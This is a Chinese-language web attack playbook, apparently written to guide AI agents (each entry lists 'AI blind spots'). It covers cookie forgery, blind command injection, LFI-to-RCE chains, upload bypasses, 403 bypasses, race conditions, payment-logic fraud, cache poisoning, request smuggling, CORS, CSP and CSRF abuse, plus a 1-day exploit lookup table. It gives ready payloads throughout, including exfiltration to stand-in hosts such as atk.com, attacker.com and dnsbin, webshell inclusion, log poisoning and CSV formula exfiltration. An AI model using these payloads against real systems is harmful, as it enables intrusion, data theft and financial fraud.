- **决策树**: 先 base64 解码 → ①unsigned JSON（明文 `{"user":"admin"}`）→ 直接伪造 5 秒 ②Flask itsdangerous 签名（`eyJ...`+`.`+签名）→ `flask-unsign --unsign --cookie <val> --wordlist <dict>` 爆破密钥 → 拿到密钥 `flask-unsign --sign --cookie "{'user':'admin'}" --secret <key>` 伪造 ③JWT → 见 JWT 条目 ④encrypted → 走密码学误用条目
- **关键判断**: ⛔ 不要在 unsigned cookie 上跑 flask-unsign 浪费 25 分钟——先解码看结构再选工具
- **API 参数操控**（接口级）: `pageSize=9999` 放大拖全量 / `info→list` 端点变换 / 空数组 `[]` 删 Token 绕过认证 / `verbose=true`/`debug=1` 触发详细回显
- **证实**: 伪造管理员 Cookie 登录 / 绕过认证 / 拖全量数据

### 命令注入盲打 Polyglot
- **信号**: 命令注入点无回显，引号上下文不确定
- **假设**: 单次 Polyglot Payload 可覆盖所有引号上下文
- **验证**: 一次覆盖无引号/单引号/双引号三种上下文 → DNS Bin 逐字节时间盲注 `for i in $(ls /); do host "$i.dnsbin.example.com"; done` → nohup 后台化长命令
- **证实**: DNS Bin 收到目标发来的文件列表 DNS 请求
- **升级**: Shell 已获 → 反弹 Shell → 稳定化

### 命令注入 PHP/Java 分类
- **信号**: 后台诊断（ping/traceroute）、图片处理/压缩/转码、调 tar/ffmpeg/convert/curl 的业务
- **验证**:
  - **PHP**: 危险函数分两类——系统执行（`system`/`exec`/`shell_exec`/反引号/`passthru`/`popen`/`proc_open`）vs 代码执行（`eval`/`assert`/`preg_replace /e`/`call_user_func`/`create_function`）→ 分隔符 `;` `&&` `||` `|` 换行 反引号 `$()` → 空格绕过 `${IFS}`/Tab → 参数注入（不能闭合命令时追加危险参数）
  - **Java 关键分支**: `Runtime.exec()` 默认**不经过 `/bin/sh -c`** → 多为"参数注入"而非经典分隔符注入；只有手动套 `/bin/sh -c` 才走传统注入 → 危险点：`Runtime.getRuntime().exec` / `ProcessBuilder`（看参数数组如何构造）/ `ProcessImpl`（反射 start）/ `ScriptEngineManager` 远程加载脚本 / `GroovyShell.evaluate` → Win/Linux payload 不能混用
- **证实**: 命令执行返回输出
- **升级**: OS 控制 → 后渗透
- **AI 盲区**: 模型会测经典分隔符注入，但不知道 Java `Runtime.exec` 不经 shell 导致利用方式完全不同

### 环境变量隐式执行矩阵
- **信号**: 可控制进程环境变量（CGI、`execve` 变参、服务配置）但无法直接命令注入
- **验证**（非交互 shell 自动执行的环境变量）: `BASH_ENV=/tmp/evil.sh`（bash 每次 `system()`/`popen()` 非交互启动时 source）→ `ENV=/tmp/evil.sh`（POSIX sh 同效）→ `PROMPT_COMMAND="curl http://atk.com/$(whoami)"`（交互提示前执行）→ `PYTHONSTARTUP` / `PERL5OPT='-Mbase;system("id")'` / `NODE_OPTIONS='--require /tmp/evil.js'`（每次 Node 调用预加载）→ `RUBYOPT='-r/tmp/evil.rb'`
- **证实**: 后续进程启动时执行恶意代码
- **升级**: 无直接注入点的 RCE → 服务器控制

### 文件包含 LFI/RFI（PHP）
- **信号**: URL 含 `?page=`/`?file=`/`?template=` 参数，应用拼接模板/主题/插件路径
- **假设**: 用户可控路径传入 `include`/`require` → 读文件/包含执行/配合伪协议
- **验证**:
  1. **目录穿越**: `?file=../../../../etc/passwd` → 读文件；注意弱过滤（只替换一次 `../` → 双重编码 `....//`、`..%2f`）
  2. **PHP 伪协议**（重点）: `php://filter/read=convert.base64-encode/resource=index.php` 读源码 → `php://input` 把 POST body 当代码包含执行（需 `allow_url_include=On`）→ `data://text/plain;base64,PD9waHA...` 直接包含 payload → `phar://` 触发反序列化链 → `zip://` 包含压缩包内文件
  3. **日志包含 → RCE**: 伪造 `User-Agent` 写入 PHP 代码到 access log → `?file=/var/log/apache2/access.log` 包含执行；同理 Session 文件、`/proc/self/environ`（User-Agent 注入）、临时上传文件、`/tmp`
  4. **RFI**（少见）: `?file=http://attacker.com/shell.txt` 需 `allow_url_fopen` + `allow_url_include` 双开
  5. **结合**：`php://filter` 读配置 → 找日志/上传路径 → 日志包含 RCE
- **证实**: 读到 /etc/passwd 或源码，或包含执行命令
- **升级**: 源码泄露 → 白盒审计；RCE → 服务器控制
- **AI 盲区**: 模型会测 LFI 读文件，但不会主动走"读源码→找日志路径→日志注入→包含执行"完整升级链，且常漏 `php://filter`/`phar://` 伪协议

### LFI → RCE 升级链
- **信号**: 已确认 LFI，需升级到代码执行
- **验证**（按优先级）:
  1. **php://filter 纯链 RCE**（最强大，先试）: `synacktiv/php_filter_chain_generator` 把多个 `convert.iconv` filter 链成写任意字节（不写文件不碰日志）→ `python3 php_filter_chain_generator.py --chain '<?php system("id");?>'`；盲读用 `synacktiv/php_filter_chains_oracle_exploit`（dechunk 逐字符 oracle）
  2. **pearcmd.php**（Docker PHP 高发）: `?file=pearcmd.php&+config-create+/<?=phpinfo()?>/tmp/shell.php` → 或 `+download+http://attacker/shell.php`（pear 自带功能写文件）
  3. **iconv CVE-2024-2961**: glibc < 2.39 + PHP `php://filter/convert.iconv.UTF-8.ISO-2022-CN-EXT/resource=` 链 → 堆溢出 → RCE（工具 cnext-exploits）
  4. **日志投毒**: Apache access.log（UA 注入 PHP）→ SSH auth.log（`<?php system('id');?>@target`）→ mail.log（subject 注入）→ `/proc/self/environ`（CGI/FastCGI 下 UA 注入）→ PHP session（`/tmp/sess_SESSID`）
  5. **phpinfo() 辅助竞态**: 上传 tmp 文件到 phpinfo 页 → 读 tmp 路径 → 竞态包含
- **证实**: 包含执行 PHP 代码
- **升级**: RCE → 服务器控制

### 文件上传绕过
- **信号**: 目标有头像/附件/导入/富文本/插件安装等上传功能
- **假设**: 服务端只校验扩展名/MIME/文件头单点 → 可组合绕过
- **验证**:
  1. **扩展名绕过**: 双扩展 `shell.php.jpg`、大小写 `shell.pHp`、特殊后缀 `phtml`/`php5`/`php7`/`shtml`、Windows 点/空格/短文件名差异
  2. **MIME 绕过**: 改包 `Content-Type: image/jpeg` 但内容为脚本
  3. **文件头绕过**: 图片头（GIF89a 等）+ 后拼接脚本 → 图片马（通过 `getimagesize()` 检查）
  4. **黑名单绕过**: 双写 `shell.pphphp` → `shell.php`、`a.s.ps.ps.spp` → 递归替换后变 `shell.php`
  5. **内容绕过**: `.htaccess` 上传（若可覆写 → 配置 `.php` 解析任意文件）→ `user.ini`（PHP 每个目录可配 `auto_prepend_file` → 包含图片马）→ `web.config`（IIS 配置解析）
  6. **解析漏洞**: Apache 多后缀解析 `shell.php.abc.xyz` → 未知扩展向前解析；IIS 6.0 `shell.asp;.jpg` 目录解析；Nginx `fastcgi` 解析 `shell.jpg/a.php`（`cgi.fix_pathinfo=1`）
  7. **上传 OSS/CDN 直传**: 对象存储签名 url 可预测 → 覆盖已有文件 / 上传后地址可枚举
- **证实**: 上传的脚本文件被服务器解析执行（WebShell）
- **升级**: WebShell → 服务器控制 → 内网横向
- **AI 盲区**: 模型知道基础绕过（大小写/双扩展），但不会主动组合 `.htaccess`+`user.ini`+Nginx 解析差异多层绕过

### 任意文件读取 / 目录穿越
- **信号**: 下载/预览/导出功能含文件名参数（`?file=`/`?path=`/`?download=`）
- **验证**: `../` 穿越 → 绝对路径直接读 `/etc/passwd` → Windows `..\..\windows\win.ini` + `::$DATA` → 编码变体（`..%2f`/`..%5c`/`....//`/unicode）→ 读应用源码（.py/.php/.env）→ 读云凭据（`.aws/credentials`）
- **证实**: 读到目标文件内容
- **升级**: 源码/配置/凭据泄露 → 进一步利用

### 401/403 绕过矩阵
- **信号**: `/admin`、API 端点或受限路径返回 401/403
- **假设**: 反向代理/WAF 与后端对路径、方法、头的规范化不一致 → 放行与拒绝产生分歧
- **验证**（按序，命中即止）:
  1. **路径操纵**: 尾斜杠 `/admin/`、尾点 `/admin/.`、大小写 `/Admin`、URL 编码 `/%61dmin`、双重编码 `/%2561dmin`（代理解码一次后≠/admin，后端再解码=admin）、Unicode 过长编码 `/%C0%AE`、点段 `/./admin`、双斜杠 `//admin`、Tomcat 路径参数 `/admin;x` + `/admin..;/`、null 字节 `/admin%00`、IIS 反斜杠 `/admin\` + `/$DATA`、扩展后缀 `/admin%20` `/admin.json`
  2. **方法绕过**: 换 POST/PUT/PATCH/DELETE/OPTIONS/HEAD（ACL 常只查 GET）、TRACE（XST 反射头）、自定义方法 `FOOBAR`/`GETS`、WebDAV `PROPFIND`/`MOVE`、覆盖头 `X-HTTP-Method-Override: PUT` + `_method=PUT`（Rails/Laravel body）
  3. **头部绕过**: URL 重写 `X-Original-URL: /admin`（代理见 `GET /`，后端路由到 /admin）、`X-Rewrite-URL`、IP 伪造 `X-Forwarded-For`/`X-Real-IP`/`True-Client-IP`/`X-Custom-IP-Authorization: 127.0.0.1`、`Referer: https://target.com/admin`、`Host: localhost`（信任判断）、`X-Forwarded-Host`
  4. **协议降级**: HTTP/1.0（ACL 只匹配 1.1）、HTTP/3 QUIC（多数 WAF/IPS 只查 TCP → 完全绕过；0-RTT 重放、连接迁移绕 IP 白名单）
  5. **网关不一致**: `/v1/admin` 403 vs `/v2/admin` 200（新版本无鉴权中间件）、直接访问后端 `backend-svc:8080/admin`（网关有鉴权后端无）、移动端/内部渠道 `/mobile/v1/admin`
- **工具**: byp4xx（50+ 变体自动扫）、403bypasser、feroxbuster、dirsearch
- **证实**: 任一变体返回 200/301/302
- **升级**: 访问管理面板 → 认证绕过 → 数据/权限
- **AI 盲区**: 模型通常只知 2-3 个头部绕过，缺完整路径变换矩阵 + 动词×路径组合 + 2026 QUIC/网关侧新面

### 竞态条件 / TOCTOU
- **信号**: 一次性/状态变更操作（领券、兑换、转账、下单、验证码发送、审核、OAuth 绑定邮箱）
- **假设**: check 与 update 非原子（`SELECT` 校验后 `UPDATE` 无 `FOR UPDATE`/无 UNIQUE 约束）→ 并发请求同时通过校验
- **验证**:
  1. 捕获状态变更请求 → 并发发 20-100 份 → 判定 0/1 vs N 成功（N=竞态）
  2. **HTTP/1.1 last-byte sync**: 所有请求发送到差最后一字节，同时释放
  3. **HTTP/2 单包攻击**（首选）: h2spacex `send_multiple_requests_at_once` 将 N 个流合并进同一 TCP 段，服务端分发间隔 <100μs，远超 H1 的 1-5ms 抖动
  4. Turbo Intruder: `engine.queue(req, gate='race1')` × N → `openGate` 同步释放；`x-request: %s` 唯一标记关联日志
- **典型目标**: 限流绕过（先查后增计数器并发击穿 → 验证码轰炸/超额调用）、余额双花（多线程转账）、优惠券重复兑换、库存超卖、邮件验证+提权（verify 与 upgrade 并发）
- **数据库角度**: 检查隔离级别（READ COMMITTED 最易 TOCTOU）、`SELECT...FOR UPDATE`、UNIQUE 约束、Redis `INCR` 原子 vs `GET+SETEX` 非原子、乐观锁 version 字段并发写
- **证实**: 多个 200 / 余额负数 / 重复台账 / 限额击穿
- **升级**: 资金/库存/权限损失；2026 新增 AI Agent 工具调用层并发竞态（grant_role/debit 未序列化）
- **AI 盲区**: 模型不会想到用 HTTP/2 多路复用合并单包 + gate 同步释放来最大化命中 TOCTOU 窗口

### 业务逻辑漏洞（价格篡改/流程跳过）
- **信号**: 电商/充值/活动/多步交易流程；前端传价格/数量/金额/类型参数
- **验证**:
  1. **负数量/负价格**: `{"quantity": -5, "price": -99.99}` → 账户入账/反向转账
  2. **小数数量 0元购**: `{"skuQty": 0.02}`（后端信任 float 数量，`unit_price*quantity` 未强制整数）→ ¥500 实付 ¥10；外卖 `FoodNum=0.01` 同型
  3. **删字段降档**: 移除 `prizeIdList` 字段 → 服务端回退 `"payType": "free"`（参数存在性信任缺陷——"字段缺失"被当作"无付费项"）
  4. **整数溢出归零**: `amount=999999999` / `quantity=2147483648`（INT_MAX+1 溢出）→ 系统存 0 应付（测前协调，可能崩支付服务）
  5. **舍入套利**: 充值 `¥0.019` → 网关向下取整扣 `¥0.01`、钱包向上入 `¥0.02` → 每轮净赚 ¥0.01 重复刷
  6. **流程跳过**: 支付流程绕过（跳过 pay 步骤直达 confirm）→ 多步验证跳过（注册/审核/绑定）→ 多端并发 VIP 订阅
- **证实**: 未付/少付获得商品/服务，或跳过步骤完成本应付费的操作
- **升级**: 免费购物/充值 → 资金损失 → 账户接管
- **AI 盲区**: 模型会测 IDOR/注入，但不会主动"删字段降档、小数数量、舍入套利、溢出归零"这些参数存在性/精度信任缺陷

### Web 缓存欺骗 / 缓存投毒
- **信号**: 目标在 CDN/反向代理后（`X-Cache`/`Age`/`Via` 头），有认证内容且可能被缓存
- **假设**: CDN 按文件扩展缓存，应用忽略扩展 → 认证响应被缓存；未键控输入被反射进缓存
- **验证**:
  - **缓存欺骗**（窃数据）: `/account/profile/nonexistent.css` → 应用忽略 `.css` 返回认证内容 → CDN 缓存 → 攻击者无认证请求 `X-Cache: HIT` 拿到受害数据；变体 `;.css`/`%2F.css`/`/x.js`
  - **缓存投毒**（放恶意）: 未键控头 `X-Forwarded-Host: evil.com` 被反射进 `<script src>`/meta 标签并缓存 → 全用户加载攻击者 JS；`X-Original-URL`、Fat GET body 参数反射但不在缓存键
  - **2026**: HTTP/2/3 头走私投毒缓存、`stale-while-revalidate` 延长投毒窗口、Service Worker 持久投毒、ESI 注入（`<esi:include src=http://attacker/>` + `$(HTTP_COOKIE)` 绕 HttpOnly 窃 cookie）、Pingora 缓存键碰撞 CVE-2026-2833/2835/2836（仅路径为键 → 跨站缓存碰撞）、API Gateway 无鉴权缓存命中、边缘计算（Workers 未键控头嵌入响应）
- **证实**: 二次请求 `X-Cache: HIT` 返回认证内容或投毒响应
- **升级**: 认证数据窃取 / 全局 XSS / 持久投毒
- **AI 盲区**: 模型混淆"欺骗（窃数据）"与"投毒（放恶意）"，且不会主动测缓存键与路径规范化差异

### 原型链污染（PP）
- **信号**: JSON body 被深度 merge（`Object.assign`/`_.merge`/`$.extend(true,...)`/`set()`）、React RSC、AI Agent 配置 merge
- **假设**: `__proto__`/`constructor.prototype` 注入污染全局原型 → 模板引擎/进程 RCE 或客户端 XSS
- **验证**:
  1. 探测: `{"__proto__":{"pptest123":"1"}}` → 全局出现 `pptest123` 即污染成功；`{"__proto__":{"toString":1}}` → 500 崩溃
  2. **服务端 RCE gadget**: EJS `outputFunctionName`（渲染任意模板即 RCE）、Pug `block.type:Text`、Handlebars `type:Program`+`constructor.constructor`、Nunjucks `type:Code`、通用 `child_process.spawn` 继承原型 → `Object.prototype.shell=/proc/self/exe` + `NODE_OPTIONS=--require /proc/self/cmdline`
  3. **客户端**: jQuery `innerHTML`、Lodash `sourceURL` 注入 Function、DOM 属性 `src/href/action`
  4. **过滤器绕过**: `{"constructor":{"prototype":{...}}}`、`__pro__proto__to__`、`?constructor[prototype][x]=y`
  5. **2026 通用链**: React2Shell CVE-2025-55182（CVSS 10，Next.js App Router 默认，39% 云环境受影响）、protobuf.js CVE-2026-44291（PP→代码生成→new Function）、WebSocket 消息解析 PP（绕过 WAF）、AI Agent 框架 PP→工具劫持
- **证实**: 原型被污染 / RCE / XSS
- **升级**: RCE → shell；AI Agent 配置污染 → 工具链滥用/数据外带
- **AI 盲区**: 模型知道概念但不会给 EJS/Pug/Handlebars 逐个 gadget 精确 payload，也不会走"污染→模板编译→RCE"链

### HTTP 请求走私（Desync）
- **信号**: 前端代理/CDN/WAF + 源站两级 HTTP 处理，且对 framing 理解可能不一致
- **假设**: CL.TE / TE.CL / TE.TE / H2→H1 降级歧义 → 把一个完整第二个请求塞进第一个请求
- **验证**:
  1. 双 `Content-Length` + `Transfer-Encoding` 头探测哪个优先
  2. **CL.TE**（前端信任 CL，后端信任 chunked）: `Content-Length: 13` + chunked body `0\r\n\r\nSMUGGLED`
  3. **TE.CL**（前端信任 chunked，后端读 CL）: `Content-Length: 4` 只读长度行，剩余拼下一请求
  4. **TE.TE 混淆**（RFC 9112 后唯一存活的传统变体）: `xchunked`/`chunked, identity`/`TE : chunked`（空格）/`TE:\tchunked`/`TE:\x0bchunked`（竖线 Envoy+Gunicorn 仍可利用）/前导空格/跨行折叠
  5. **2026 主战场 H2→H1 降级**: H2.CL（声明 content-length:0 但 DATA 帧带 body → 后端读 0 字节，剩余成下一请求）、H2.TE、H2 CRLF 头注入（二进制头值含 \r\n → 降级拆请求）；CL.0（Nginx+Waitress）；客户端 desync（浏览器 fetch no-cors body 注入 GET）、WebSocket 走私、多 CDN 链双重降级
- **证实**: 第二个请求被后端执行（队列投毒/绕过前端 ACL/缓存投毒）
- **升级**: WAF 绕过 → 劫持其他用户请求 → 缓存投毒 → 认证边界混淆
- **AI 盲区**: 模型会混淆"头注入"与"消息边界分歧"——走私是 CL/TE 对请求在哪结束的分歧，不是往响应插 CRLF

### CORS 误配 / JSONP 劫持
- **信号**: API 响应含 `Access-Control-Allow-Origin` 且由请求 `Origin` 反射 / 接口用 JSONP（callback 参数）
- **假设**: CORS 配置失误 → 恶意页面**带着受害者登录态读取敏感数据**（CSRF 是写，CORS 是读）
- **验证**:
  1. `curl -s -I -H "Origin: https://evil.com" https://target.com/api/userinfo` → 观察响应头：ACAO 反射 + `Access-Control-Allow-Credentials: true` = 高危
  2. **反射 Origin + 允许凭证**: 任意站点可读受害者数据 → PoC：受害者登录态访问恶意页，`fetch(url, {credentials:'include'})` 读数据外带
  3. **信任 null Origin**: 白名单写 `null` → sandbox iframe 制造 null origin 读取
  4. **域名校验写错**: 前缀匹配 `target.com.evil.com` 通过 / 后缀匹配 `eviltarget.com` / `includes()` 判断 `evil.com/?x=target.com` 通过
  5. **信任全部子域 + 子域 XSS/接管**: `*.target.com` 白名单 → 先拿下子域再从子域带凭证跨域读
  6. **JSONP 劫持**: `<script src>` 天然跨域 → 接口返回 `callback({"uid":...,"phone":...})` → callback 可控 + 无 Referer/Token 校验 → 攻击者定义同名回调读走数据；挖法关键词 `callback`/`jsonp`
- **证实**: 跨域读取到受害者敏感数据
- **升级**: 数据窃取 → 结合 CSRF（读 CSRF token → 再打 CSRF）
- **AI 盲区**: 模型知道 ACAO 反射概念，但不会主动测 null origin、前缀/后缀/`includes()` 三种校验绕过、JSONP callback 劫持

### CSP 绕过
- **信号**: 页面有 Content-Security-Policy 限制 XSS 外带/脚本执行
- **验证**:
  1. **数据带外**: `location.href = "vps:port?"+document.cookie`（可执行 JS 但 CSP 挡外带时的首选）
  2. **老浏览器 link**: `<link rel="dns-prefetch" href="//${cookie}.vps">`（Firefox）/ `<link rel="prefetch" href="//vps?${cookie}">`（Chrome 老版本）
  3. **同源无 CSP 页 iframe**: A 页有 CSP + B 页同源无 CSP 且有 XSS → B 页建 iframe 用 JS 直接操作 A 页 DOM，A 的 CSP 完全失效
  4. **CSP 白名单内站可控 JSONP**: `<script src="https://www.google.com/complete/search?...&callback=alert">`（白名单站内 JSONP 反射）
  5. **CDN 低版本框架**: CSP 放行 CDN 域 → 引低版本 Angular（模板注入）等绕过
  6. **base-uri / object-src / CSS 选择器** 等弱配置面；CRLF 头注入改 CSP
- **证实**: 绕过 CSP 执行脚本/外带数据
- **升级**: XSS 变可利用 → 会话窃取
- **AI 盲区**: 模型知道 CSP 概念但不会枚举"同源无 CSP 页 iframe 破防、白名单 JSONP、CDN 框架降级"这些组合绕过

### CSRF（跨站请求伪造）
- **信号**: 目标用 Cookie 认证且无 SameSite/Token/Origin 校验，无 CSRF Token 的状态变更 GET/POST 接口
- **验证**: 页面自动提交表单（`<form action="https://target.com/transfer" method="POST"><input name="to" value="attacker">` + 自动 submit）→ SameSite 防护（现代浏览器默认 Lax → 跨站 POST 不自动带 Cookie，但 GET 仍带）→ SameSite 绕过：`<form method="GET">` 或 JSON 接口 `Content-Type: application/json` 跨域 POST（需预检请求，带 Cookie 的预检被 CORS 拦）→ 登录 CSRF（诱导用户登录攻击者账号 → 记录其操作轨迹）→ 前后端分离接口读 Token（需先 CORS 读 Token → 再 CSRF 打状态变更）
- **证实**: 受害者浏览器在登录态下执行了攻击者指定的操作
- **升级**: 资金/权限/状态变更；+XSS → 窃 CSRF Token → 打 CSRF 组合拳

### PHP Type Juggling（弱比较绕过）
- **信号**: PHP 登录/签名逻辑用 `==` 松散比较密码/token/HMAC（非 `===`/`hash_equals`），或 `md5($a)==md5($b)` 形式
- **验证**: 数组绕过 `password[]=x`（`md5([])==md5([])` 恒真）→ 空串/`0`/`true` 值注入 → **Magic Hash**：`md5('240610708') == md5('QNKCDZO')` 均以 `0e` 开头按浮点解析为 0.0 恒等 → 数值比较 `'123a' == 123` 为真（字符串前缀数字转数值）→ `strcmp()`/`json_decode(...,true)`/`intval()` 变体 → `admin%00` 截断
- **证实**: 未知密码下通过认证/HMAC 校验
- **升级**: 认证绕过 → 账户接管
- **关键判断**: 先确认代码用 `==` 还是 `===`/`hash_equals`——后者此路径不适用

### CSV 公式注入（CSV Formula Injection）
- **信号**: 导出 CSV/XLSX 或报表含用户可控字段（姓名/备注/手机号），后端→BI/邮件发送
- **验证**: 单元格以 `=`/`+`/`-`/`@` 开头触发公式执行 → DDE `=cmd|'/C calc'!A0` / `@SUM(1+1)*cmd|'/C calc'!A0` → 云表格 `=WEBSERVICE("http://attacker/?leak="&A1)`（Excel OOB）/ `=IMAGE("http://attacker/pixel?d="&A1)`（Sheets 静默外带）
- **证实**: BI 仪表盘刷新/打开报表时触发请求或命令
- **升级**: 数据外带 → 客户端 RCE（Excel DDE）
- **独特点**: 非传统 Web 漏洞，是数据导出管线的"二次触发"——BI 刷新、Power Query `Web.Contents`、Office Scripts `onSelected` 均属攻击面

### Dangling Markup Injection（无 JS 数据外带）
- **信号**: 有 HTML 注入点但 JS 被禁（CSP 挡内联脚本/消毒器剥 onerror/WAF 挡 script）
- **假设**: 无需 JS 即可外带——注入未闭合的 HTML 标签，用属性值"吞掉"注入点后的页面内容，让浏览器发出含数据的请求
- **验证**: 注入 `<img src="https://attacker.com/collect?`（未闭合引号吞后续内容直到下一个引号）→ 捕获 CSRF token/预填表单值/session 隐藏字段 → 配合 `base`/`form`/`meta`/`link`/`table` 标签变体
- **证实**: 攻击者服务器收到被吞的敏感数据（CSRF token 等）
- **升级**: 窃 CSRF token → 打 CSRF；窃表单值 → 数据泄露
- **AI 盲区**: 模型见 CSP 挡 JS 就判"不可利用"，不会想到 dangling markup 绕过脚本限制

### mXSS / DOM Clobbering（XSS 高级）
- **信号**: 有 XSS 注入点但被消毒器（DOMPurify）或 CSP 限制
- **验证**:
  - **mXSS / DOMPurify 绕过**: 命名空间混淆（`<math><mtext><table><mglyph><style><!--</style><img title="--></mglyph><img src=1 onerror=alert(1)>`）→ `<noscript>` 解析差分 → form/table 重构 → DOMPurify 0.x-2.x 已知绕过链
  - **DOM Clobbering**（CSP 环境免 JS 执行）: `<form id=x name=y><input id=z></form>` 得 `document.x.y.z` → 覆写全局引用/检查逻辑（`window.config`）→ iframe srcdoc 三层链 → 覆盖 `trustedTypes` 对象 → Service Worker 持久化
  - **Trusted Types 绕过**: 默认策略滥用、非 TT sink、策略透传
  - **现代框架 sink**: React `dangerouslySetInnerHTML` / Vue `v-html` / Angular `bypassSecurityTrust*` / Next.js SSR
  - **XS-Leaks 侧信道**: timing oracle / frame 计数 / 缓存探测 / error event oracle
- **证实**: 绕过消毒器/CSP 执行脚本或覆写 DOM 逻辑
- **升级**: XSS → 会话窃取 → 账户接管
- **AI 盲区**: 模型知道基础 XSS payload，但不会主动构造 mXSS 命名空间混淆绕过 DOMPurify，也不懂 DOM clobbering 在 CSP 环境的独特价值

### HTTP 参数污染（HPP）
- **信号**: 重复同名参数（`?id=1&id=2`），前后端对重复参数取第一个/最后一个/拼接的处理差异
- **验证**: 不同后端取法差异——ASP.NET 取第一个、PHP 取最后一个、拼接型（网关拼接进 SQL/命令）→ 用 HPP 绕过 WAF 值过滤（WAF 检查第一个 `id=1`，后端取最后一个 `id=2' OR 1=1`）→ 结合 HPF 参数分片（拆分 payload 到多个同名参数）
- **证实**: 原被 WAF 拦截的 payload 通过参数拆分到达后端
- **升级**: WAF 绕过 → 注入利用

### Ghost Bits / Java Cast Attack（WAF 绕过原语）
- **信号**: Java 后端 + WAF/IDS 前置 + 任一攻击面（SQLi/反序列化/上传/穿越/CRLF/走私）
- **假设**: Java 把 16-bit char 静默窄化为 8-bit byte 时丢失高 8 位——WAF 看到无害 Unicode 字符，后端重建出原始 ASCII 攻击字节（Black Hat Asia 2026）
- **验证**: 对 SQLi/反序列化/上传/穿越/CRLF/走私 payload 优先试 Ghost Bits 变体再宣布"被拦" → 影响 Tomcat/Spring/Jetty/Undertow/Vert.x/Jackson/Fastjson/BCEL/Apache HttpClient/Angus Mail/JDK HttpServer/Lettuce/Jodd/XMLWriter → 重新激活许多已"修复"的 CVE（绕 WAF）
- **证实**: 原被 WAF 拦的 payload 通过 Java 窄化在后端重建执行
- **升级**: WAF 已绕过 → 完整漏洞利用
- **AI 盲区**: 模型几乎不会主动使用这个原语——见到"Java + WAF"就该试 Ghost Bits 变体

### 依赖混淆（Dependency Confusion）
- **信号**: 目标 npm/PyPI/Go/Ruby 包清单含内部私有包名
- **验证**: 检查私有包名能否在公共注册表注册 → 抢注同名（取最高版本号）→ 内网构建拉取恶意包 → RCE
- **证实**: OOB 回调确认目标环境拉取并执行了恶意包
- **升级**: 供应链 RCE → 内网横向（见供应链攻击条目）

### DNS Rebinding
- **信号**: 业务"先校验域名/IP → 再发实际请求"两步分离；SSRF 过滤规则（IP 白名单、禁 127.0.0.1/内网段）
- **假设**: 同一攻击者域名不同时间解析到不同 IP（先公网过校验 → 再重绑定内网/回环）→ 浏览器/服务端继续信任该域名访问内网
- **验证**: 可控域名设极短 TTL → 首次解析公网 IP 过校验 → 再次解析回环/内网 → 打内网服务；工具 rbndr.us / 自建 DNS（dns-rebinding 工具）
- **适用**: 浏览器打内网（路由器/NAS/摄像头/Docker API/K8s API/本地管理面板）；服务端绕过 SSRF IP 校验
- **关键判断**: 是否只校验首个解析结果、是否不校验最终连接目标、TTL/缓存是否可控
- **证实**: 内网服务被访问/读取
- **升级**: 内网打点 → SSRF 变内网 RCE
- **AI 盲区**: 模型会把 DNS rebinding 当纯浏览器问题，不理解为"校验与请求分离"类缺陷（常作 SSRF 绕过，Java SSRF bypass 案例）

### JNDI 注入高版本绕过
- **信号**: Java 应用可反序列化/RMI/LDAP 入口，但 JDK 高版本（RMI ≥6u132/7u122/8u113，LDAP ≥11.0.1/8u191/7u201）远程类加载被禁
- **假设**: `trustURLCodebase=false` 后远程 `ObjectFactory` 加载不可用，但可转向本地类/反序列化链
- **验证**: 本地 `Reference Factory` 利用——Tomcat `org.apache.naming.factory.BeanFactory` → 调 `javax.el.ELProcessor#eval` / `groovy.lang.GroovyShell#evaluate`（不依赖远程类）→ LDAP 返回 `javaSerializedData` 恶意序列化数据 → 触发本地 Gadget 链（JNDI 注入 + Java 反序列化结合）→ JEP 290 过滤存在时找白名单内可利用类
- **证实**: 命令执行 / 回连
- **升级**: RCE → 服务器控制
- **AI 盲区**: 模型知道 JNDI 概念，但不会处理高版本 JDK 收紧后的"本地工厂 + EL/Groovy"转向

### CRLF 注入 / 响应拆分
- **信号**: 参数被反射进响应头/Set-Cookie/Location，URL 含可注入 `%0d%0a`
- **验证**: `%0d%0a` 注入响应头 → 响应拆分打 XSS / 注入 Set-Cookie（会话固定）/ 缓存投毒入口 / 日志伪造；绕过 `%0a` 单用 / `%250d%250a` 双重解码 / `%e5%98%8a%e5%98%8d`（旧 Java 容器 Unicode 换行）→ 确认点在响应头是否出现注入行
- **证实**: 响应中出现注入的 Header 或第二个响应体
- **升级**: XSS / 会话固定 / 缓存投毒

### 1day 组件速查表（高频打点入口）
- **信号**: 指纹识别出组件后直接查对应漏洞（先指纹 → 本表 → 选 exp → dnslog 验证）
- **Java**: Shiro（rememberMe → Shiro-550 硬编码密钥反序列化 / Shiro-721 Padding Oracle）→ Fastjson（autotype，报错含 `com.alibaba.fastjson`）→ Log4j2（Log4Shell CVE-2021-44228，参数回显进日志）→ Spring（Spring4Shell CVE-2022-22965 / SpEL 注入）→ Struts2（S2-045/046/057/061 OGNL，`.action`/`.do` + 报错含 OGNL）
- **中间件**: Weblogic（7001 + `/console`，T3/IIOP 反序列化 + CVE-2020-14882）→ JBoss（JMXInvokerServlet 反序列化）→ Tomcat（AJP CVE-2020-1938 文件包含 + PUT CVE-2017-12615 + `/manager` 弱口令）→ IIS（`;.asp` 解析漏洞 + PUT）
- **PHP**: ThinkPHP 5.x RCE（路由+invokefunction）→ Laravel debug RCE（CVE-2021-3129 Ignition）→ Drupal Drupalgeddon2 → WordPress 插件系列 → Dedecms 全版本系列 → Discuz 注入
- **OA 全家**: 泛微/致远/蓝凌/用友 NC/通达 OA（文件上传/反序列化/未授权，工具 OA-EXPTOOL）
- **其他**: Confluence（CVE-2021-26084/2022-26134/2023-22515）→ Exchange（ProxyLogon/ProxyShell）→ GitLab（文件读取/RCE）→ Redis 未授权/主从 RCE → VPN 网关（深信服/奇安信/Fortinet 历史 RCE）
- **流程**: 指纹 → 查表 → 选漏洞 → 先 dnslog/httplog 出网验证 → 再深挖；打前确认版本号（很多 exp 严格依赖版本）；无回显统一走 dnslog
